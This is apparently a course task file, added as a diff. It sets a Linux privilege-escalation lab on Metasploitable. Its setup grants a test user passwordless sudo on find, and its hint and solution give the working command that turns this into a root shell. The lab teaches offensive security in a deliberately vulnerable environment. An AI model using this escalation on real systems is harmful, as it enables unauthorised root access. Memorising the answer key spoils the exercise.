@@ -1,0 +1,14 @@
+{
+    "id": "task2",
+    "chapterId": "ch_11",
+    "title": "Linux Privilege Escalation via Sudo Misconfiguration",
+    "description": "Escalate from a low-priv user to root on a simulated misconfigured system.",
+    "estimatedMinutes": 30,
+    "problemStatement": "# Objective\nSimulate a common privilege escalation scenario: exploiting a sudo misconfiguration.\n\n## Setup on Metasploitable\n1.  SSH as `msfadmin` (password: `msfadmin`).\n2.  Create a test user: `sudo useradd -m lowpriv`\n3.  Set password: `sudo passwd lowpriv` (set to `password`).\n4.  Give the user sudo rights for `find`: `sudo visudo` and add line:\n    `lowpriv ALL=(ALL) NOPASSWD: /usr/bin/find`\n5.  Exit and SSH as `lowpriv`.\n\n## Task\n1.  As `lowpriv`, check sudo permissions: `sudo -l`.\n2.  Use the allowed `find` command to spawn a root shell.\n3.  Confirm root access with `whoami` and `id`.\n\n## Deliverable\nScreenshot showing the command used and the resulting root shell prompt.",
+    "hints": [
+        "GTFOBins (https://gtfobins.github.io) is the ultimate resource for this.",
+        "Search for 'find' on GTFOBins: `sudo find . -exec /bin/sh \\; -quit`."
+    ],
+    "expectedOutput": "Root shell with `uid=0(root)`.",
+    "solutionCode": "# Setup (as msfadmin)\nsudo useradd -m lowpriv\necho \"lowpriv:password\" | sudo chpasswd\nsudo bash -c 'echo \"lowpriv ALL=(ALL) NOPASSWD: /usr/bin/find\" >> /etc/sudoers'\n\n# Exploit (as lowpriv)\nsudo -l\n# Output: (root) NOPASSWD: /usr/bin/find\n\nsudo find . -exec /bin/sh \\; -quit\nwhoami\n# Output: root"
+}
